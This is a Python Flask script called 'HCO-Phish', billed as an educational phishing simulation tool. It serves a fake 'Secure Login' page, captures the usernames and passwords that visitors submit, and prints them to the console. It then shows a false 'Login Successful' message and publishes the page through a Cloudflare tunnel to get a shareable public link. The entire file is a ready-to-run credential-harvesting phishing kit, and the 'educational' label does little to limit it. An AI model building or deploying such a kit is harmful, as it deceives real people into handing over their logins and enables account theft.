#!/usr/bin/env python3
"""
HCO-Phish
Educational Phishing Simulation Tool
By Azhar (Hackers Colony)
"""

import os, time, subprocess, threading
from flask import Flask, render_template_string, request

# ----------------------------- HTML Template -----------------------------
html_template = """
<!DOCTYPE html>
<html>
<head>
  <title>Login - HCO</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0a0a0a; color: #fff; text-align:center; }
    .box { margin-top: 100px; padding: 20px; background: #111; border-radius: 10px; display:inline-block; }
    input { display:block; margin:10px auto; padding:10px; border:none; border-radius:5px; }
    button { padding:10px 20px; border:none; border-radius:5px; background:red; color:#fff; font-weight:bold; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Secure Login</h2>
    <form method="POST" action="/capture">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
"""

# ----------------------------- Flask App -----------------------------
app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/capture', methods=['POST'])
def capture():
    user = request.form.get('username')
    pwd = request.form.get('password')
    print(f"\n\033[91m[+] Credentials Captured:\033[0m\n"
          f"\033[92mUsername:\033[0m {user}\n"
          f"\033[92mPassword:\033[0m {pwd}\n")
    return "<h3 style='color:lime;text-align:center;'>Login Successful ✅</h3>"

# ----------------------------- Cloudflare Tunnel -----------------------------
def start_cloudflare():
    os.system("pkill -f cloudflared > /dev/null 2>&1")
    print("\n[~] Starting Cloudflare Tunnel...\n")
    try:
        output = subprocess.check_output("cloudflared tunnel --url http://localhost:5000 --no-autoupdate", shell=True, stderr=subprocess.STDOUT, text=True)
        for line in output.splitlines():
            if "trycloudflare.com" in line:
                print(f"\n[+] Public Link: {line.strip()}\n")
    except Exception as e:
        print("[!] Error starting Cloudflare Tunnel:", e)

# ----------------------------- Main -----------------------------
if __name__ == "__main__":
    # Auto install
    os.system("pkg install -y python > /dev/null 2>&1")
    os.system("pkg install -y cloudflared > /dev/null 2>&1")
    os.system("pip install flask > /dev/null 2>&1")

    threading.Thread(target=start_cloudflare, daemon=True).start()
    app.run(host="0.0.0.0", port=5000)
